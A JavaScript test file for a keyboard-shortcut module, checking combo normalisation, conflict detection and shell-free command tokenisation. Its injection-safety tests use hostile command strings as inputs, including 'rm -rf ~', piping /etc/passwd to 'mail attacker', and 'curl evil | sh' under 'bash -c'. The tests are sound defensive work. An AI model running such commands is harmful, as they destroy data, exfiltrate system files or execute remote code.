const assert = require("assert");
const Conflicts = require("../Services/Keyboard/ShortcutConflicts.js");

// ─── Combo normalisation: modifier order & case ──────────────────────────
assert.strictEqual(
    Conflicts.normalizeCombo("Super+Shift+Q"),
    Conflicts.normalizeCombo("Shift+Super+q"),
    "modifier order and key case must not affect canonical form"
);

// Canonical spelling: modifiers sorted Ctrl, Alt, Shift, Super, Hyper; key lower.
assert.strictEqual(Conflicts.normalizeCombo("Shift+Ctrl+A"), "Ctrl+Shift+a");
assert.strictEqual(Conflicts.normalizeCombo("ALT+ctrl+F1"), "Ctrl+Alt+f1");

// Modifier aliases collapse (Win/Meta/Cmd -> Super, Control -> Ctrl, Mod1 -> Alt).
assert.strictEqual(Conflicts.normalizeCombo("Win+x"), Conflicts.normalizeCombo("Super+X"));
assert.strictEqual(Conflicts.normalizeCombo("Meta+x"), "Super+x");
assert.strictEqual(Conflicts.normalizeCombo("Control+c"), "Ctrl+c");
assert.strictEqual(Conflicts.normalizeCombo("Mod1+Tab"), "Alt+tab");

// Duplicate modifiers de-duplicate.
assert.strictEqual(Conflicts.normalizeCombo("Ctrl+Ctrl+a"), "Ctrl+a");

// Whitespace tolerated around tokens.
assert.strictEqual(Conflicts.normalizeCombo("  Ctrl  +  A  "), "Ctrl+a");

// Edge: empty / whitespace / nullish combos normalise to "".
assert.strictEqual(Conflicts.normalizeCombo(""), "");
assert.strictEqual(Conflicts.normalizeCombo("   "), "");
assert.strictEqual(Conflicts.normalizeCombo(null), "");
assert.strictEqual(Conflicts.normalizeCombo(undefined), "");

// ─── Conflict detection: none / one group / multiple groups ──────────────

// No conflict.
assert.deepStrictEqual(
    Conflicts.findConflicts([
        { id: "a", combo: "Ctrl+A" },
        { id: "b", combo: "Ctrl+B" }
    ]),
    []
);

// One conflict group (order-insensitive duplicate).
assert.deepStrictEqual(
    Conflicts.findConflicts([
        { id: "a", combo: "Ctrl+Shift+Q" },
        { id: "b", combo: "Shift+Ctrl+q" },
        { id: "c", combo: "Alt+F4" }
    ]),
    [["a", "b"]]
);

// Multiple conflict groups, preserving first-appearance order.
assert.deepStrictEqual(
    Conflicts.findConflicts([
        { id: "a", combo: "Ctrl+A" },
        { id: "b", combo: "Ctrl+B" },
        { id: "c", combo: "ctrl+a" },
        { id: "d", combo: "ctrl+b" },
        { id: "e", combo: "Ctrl+B" }
    ]),
    [["a", "c"], ["b", "d", "e"]]
);

// Duplicate of a built-in: a custom shortcut colliding with a built-in keybind
// surfaces as a conflict group containing both ids.
assert.deepStrictEqual(
    Conflicts.findConflicts([
        { id: "builtin:keyEscape", combo: "Esc" },
        { id: "custom:0", combo: "esc" }
    ]),
    [["builtin:keyEscape", "custom:0"]]
);

// Empty list -> no conflicts.
assert.deepStrictEqual(Conflicts.findConflicts([]), []);
// Non-array / nullish input -> no conflicts (defensive).
assert.deepStrictEqual(Conflicts.findConflicts(null), []);
assert.deepStrictEqual(Conflicts.findConflicts(undefined), []);

// Empty combos never conflict, even when several are unset.
assert.deepStrictEqual(
    Conflicts.findConflicts([
        { id: "a", combo: "" },
        { id: "b", combo: "  " },
        { id: "c", combo: "Ctrl+A" }
    ]),
    []
);

// firstConflictWith helper: finds collider, skips self, ignores empty.
assert.strictEqual(
    Conflicts.firstConflictWith("Shift+Ctrl+q", [
        { id: "a", combo: "Ctrl+Shift+Q" }
    ], "self"),
    "a"
);
assert.strictEqual(
    Conflicts.firstConflictWith("Ctrl+A", [{ id: "self", combo: "ctrl+a" }], "self"),
    null,
    "must skip the entry being edited (selfId)"
);
assert.strictEqual(Conflicts.firstConflictWith("", [{ id: "a", combo: "" }], "self"), null);

// ─── INJECTION SAFETY: malicious command never reaches a raw shell ───────

// A classic injection attempt: the metacharacters must NOT split into shell
// commands. With no quoting they tokenise into literal argv elements; argv[0]
// is the program, the rest are literal args. Crucially "rm" / "-rf" / "~" are
// just arguments to `firefox;` — they are never evaluated by a shell.
const evil = Conflicts.buildExecArgv("firefox; rm -rf ~");
assert.deepStrictEqual(evil, ["firefox;", "rm", "-rf", "~"]);
// The dangerous separator stays glued to argv[0] as a literal; it is not its
// own command, and "rm" is a literal arg, not an executed program.
assert.strictEqual(evil[0], "firefox;");
// Sanity: nothing in argv is the string that a shell would treat as a command
// separator on its own.
assert.ok(evil.indexOf(";") === -1, "bare ';' separator must never appear as its own token");

// Pipes, command substitution, redirection, logical-and: all inert literals.
assert.deepStrictEqual(
    Conflicts.buildExecArgv("cat /etc/passwd | mail attacker"),
    ["cat", "/etc/passwd", "|", "mail", "attacker"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("echo $(whoami)"),
    ["echo", "$(whoami)"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("echo `id`"),
    ["echo", "`id`"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("foo && rm bar"),
    ["foo", "&&", "rm", "bar"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("foo > /etc/shadow"),
    ["foo", ">", "/etc/shadow"]
);

// Quoting is honoured for legitimate multi-word args, but quoted shell
// metacharacters stay literal inside the single token.
assert.deepStrictEqual(
    Conflicts.buildExecArgv("notify-send 'Hello; World'"),
    ["notify-send", "Hello; World"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv('foo "a b" c'),
    ["foo", "a b", "c"]
);

// Empty / whitespace / nullish command -> empty argv (caller runs nothing).
assert.deepStrictEqual(Conflicts.buildExecArgv(""), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("   "), []);
assert.deepStrictEqual(Conflicts.buildExecArgv(null), []);
assert.deepStrictEqual(Conflicts.buildExecArgv(undefined), []);

// SHELL RE-ENTRY: a command that makes a shell argv[0] with -c would hand its
// argument back to a real shell. buildExecArgv must REFUSE (return []), so the
// untrusted command line never reaches `sh -c`.
assert.deepStrictEqual(Conflicts.buildExecArgv("sh -c 'rm -rf ~'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("/bin/sh -c 'rm -rf ~'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("bash -c \"curl evil | sh\""), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("/usr/bin/zsh -lc 'id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("env bash -c 'id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("env FOO=bar sh -c 'id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("env -u HOME bash -c 'id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("busybox sh -c 'id'"), []);
// env launching a NON-shell program with -c is legitimate (python/gcc), not a
// shell re-entry, so it must be allowed.
assert.deepStrictEqual(
    Conflicts.buildExecArgv("env python3 -c 'print(1)'"),
    ["env", "python3", "-c", "print(1)"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("env FOO=bar gcc -c foo.c"),
    ["env", "FOO=bar", "gcc", "-c", "foo.c"]
);
// env with no program to launch is harmless.
assert.strictEqual(Conflicts.isShellInvocation(["env", "FOO=bar"]), false);
// FAIL-SAFE: env options we cannot reason about (especially -S /
// --split-string which re-parse their argument into a command line, and
// argument-bearing options like --chdir) are refused.
assert.deepStrictEqual(Conflicts.buildExecArgv("env -S 'sh -c id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("env --split-string='sh -c id'"), []);
assert.deepStrictEqual(Conflicts.buildExecArgv("env --chdir /tmp sh -c id"), []);
// Whitelisted harmless no-arg env flags still allow a non-shell program.
assert.deepStrictEqual(
    Conflicts.buildExecArgv("env -i python3 -c 'print(1)'"),
    ["env", "-i", "python3", "-c", "print(1)"]
);
assert.deepStrictEqual(
    Conflicts.buildExecArgv("env -u HOME python3 -c 'print(1)'"),
    ["env", "-u", "HOME", "python3", "-c", "print(1)"]
);
// ...but a whitelisted flag in front of a real shell is still caught.
assert.deepStrictEqual(Conflicts.buildExecArgv("env -i sh -c id"), []);
// isShellInvocation directly.
assert.strictEqual(Conflicts.isShellInvocation(["sh", "-c", "x"]), true);
assert.strictEqual(Conflicts.isShellInvocation(["/bin/bash", "-lc", "x"]), true);
// A shell WITHOUT -c (interactive / script-file form) is not a -c re-entry;
// it still launches a program directly with literal args, so it is allowed.
assert.deepStrictEqual(Conflicts.buildExecArgv("sh script.sh"), ["sh", "script.sh"]);
assert.strictEqual(Conflicts.isShellInvocation(["sh", "script.sh"]), false);
// Non-shell programs with a -c flag are fine (e.g. gcc -c).
assert.deepStrictEqual(Conflicts.buildExecArgv("gcc -c foo.c"), ["gcc", "-c", "foo.c"]);
assert.strictEqual(Conflicts.isShellInvocation(["gcc", "-c", "foo.c"]), false);
assert.strictEqual(Conflicts.isShellInvocation([]), false);

// ─── buildCustomShortcut: canonical record ───────────────────────────────
assert.deepStrictEqual(
    Conflicts.buildCustomShortcut("Super+Shift+Q", "firefox", "Browser"),
    { combo: "Shift+Super+q", command: "firefox", name: "Browser" }
);
// Name defaults to the command when omitted/blank.
assert.deepStrictEqual(
    Conflicts.buildCustomShortcut("Ctrl+Alt+T", "kitty", ""),
    { combo: "Ctrl+Alt+t", command: "kitty", name: "kitty" }
);
// Command is preserved verbatim (raw) so the user can edit it; safety is the
// runner's job via buildExecArgv. The record stores the canonical combo.
const rec = Conflicts.buildCustomShortcut("Win+e", "firefox; rm -rf ~", "Evil");
assert.strictEqual(rec.combo, "Super+e");
assert.strictEqual(rec.command, "firefox; rm -rf ~");
// And running that stored command still produces a SAFE argv (no shell).
assert.deepStrictEqual(Conflicts.buildExecArgv(rec.command), ["firefox;", "rm", "-rf", "~"]);

// Missing combo or command -> null (cannot build an actionable shortcut).
assert.strictEqual(Conflicts.buildCustomShortcut("", "firefox", "x"), null);
assert.strictEqual(Conflicts.buildCustomShortcut("Ctrl+A", "", "x"), null);
assert.strictEqual(Conflicts.buildCustomShortcut("Ctrl+A", "   ", "x"), null);
// A shell-invocation command cannot be stored as a safe shortcut -> null.
assert.strictEqual(Conflicts.buildCustomShortcut("Ctrl+A", "sh -c 'rm -rf ~'", "x"), null);
assert.strictEqual(Conflicts.buildCustomShortcut("Ctrl+A", "bash -c id", "x"), null);

console.log("shortcut-conflicts: all assertions passed");
